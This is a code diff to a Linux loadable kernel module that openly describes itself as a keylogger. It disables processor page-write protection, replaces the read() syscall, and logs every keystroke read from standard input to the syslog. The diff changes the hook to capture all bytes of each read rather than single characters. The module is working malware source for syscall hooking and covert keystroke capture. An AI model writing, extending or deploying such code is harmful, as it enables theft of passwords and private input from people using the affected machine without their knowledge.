@@ -17,15 +17,19 @@ asmlinkage long (*original_read) (unsigned int fd, char __user *buf, size_t coun
  * Our manipulated read syscall. It will print every keystroke to the syslog
  * and call the original read afterwards.
  */
-asmlinkage long manipulated_read(unsigned int fd, char __user *buf, size_t count)
+asmlinkage long manipulated_read (unsigned int fd, char __user *buf, size_t count)
 {
 	long ret;
 	ret = original_read(fd,buf,count);
 	
 	//read from stdin and print it using printk
-	if(count == 1  && fd==0)
+	if(ret >= 1 && fd == 0)
 	{
-		printk(KERN_INFO "[Keylogger] '%c' (0x%02x)\n", buf[0], buf[0]);
+		int i;
+		for(i = 0; i < ret; i++)
+		{
+			printk(KERN_INFO "[Keylogger] '%c' (0x%02x)\n", buf[i], buf[i]);
+		}
 	}
 
 	return ret;
@@ -34,7 +38,7 @@ asmlinkage long manipulated_read(unsigned int fd, char __user *buf, size_t count
 /*
  * Disable the writing protection for the whole processor.
  */
-static void disable_page_protection(void)
+static void disable_page_protection (void)
 {
 	unsigned long value;
 	asm volatile("mov %%cr0,%0" : "=r" (value));
@@ -48,7 +52,7 @@ static void disable_page_protection(void)
 /*
  * Reenable the writing protection for the whole processor.
  */
-static void enable_page_protection(void)
+static void enable_page_protection (void)
 {
 	unsigned long value;
 	asm volatile("mov %%cr0,%0" : "=r" (value));
@@ -63,7 +67,7 @@ static void enable_page_protection(void)
  * Function called when loading the kernel module.
  * Prints a welcome-message and replaces the read() syscall.
  */
-int init_module(void)
+int init_module (void)
 {
 	printk(KERN_INFO "Loading keylogger LKM...\n");
 	
@@ -90,7 +94,7 @@ int init_module(void)
  * Function called when unloading the kernel module.
  * Prints a goodbye-message and restores the original read() syscall.
  */
-void cleanup_module(void)
+void cleanup_module (void)
 {
 	printk(KERN_INFO "Unloading keylogger... bye!\n");
 
